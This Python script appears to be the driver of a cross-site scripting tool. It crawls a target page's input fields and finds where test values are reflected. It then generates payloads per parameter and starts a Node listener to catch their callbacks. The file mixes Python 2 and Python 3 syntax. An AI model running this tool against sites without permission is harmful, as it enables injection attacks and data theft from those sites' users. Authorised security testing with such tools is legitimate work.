import sys
import urllib
import requests
import re
from functools import reduce
from random import choice
from subprocess import Popen

from core import context, genPayload, config, utils

from core.context import getContext
from core.genPayload import genPayload
from core.config import headers, TEST_INJCT
from core.testFilter import testFilter
from core.utils import get_key_from_val

if len(sys.argv) < 2:
    print("usage: python xss.py url")
    sys.exit()

url = sys.argv[1]
if "http://" not in url:
    url = "http://" + url

input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'

response = requests.get(url, headers=headers)
params = re.findall(input_reg, response.text)

# make request with test values to determine where the test inputs are reflected
data = {params[i-1] : TEST_INJCT + str(i) for i in range(1, len(params) + 1)}
test_response = requests.get(url, headers=headers, params=data)

reflection_contexts = getContext(test_response)

payloads = {}
url = url if url[-1:] == '/' else url + '/'

for i, ctx in enumerate(reflection_contexts):
    test_input = TEST_INJCT + ctx.paramNum 
    param = get_key_from_val(test_input, data)
    if param:
        payloads[param] = genPayload(ctx, url, param)

print "Payloads ..."
for v in payloads.values():
    print v

print "Starting listening server ..."
try:
    Popen(["node","server.js"], stdin=sys.stdin, stdout=sys.stdout)
    while True:
        continue
except KeyboardInterrupt:
    print "Shutting down listener..."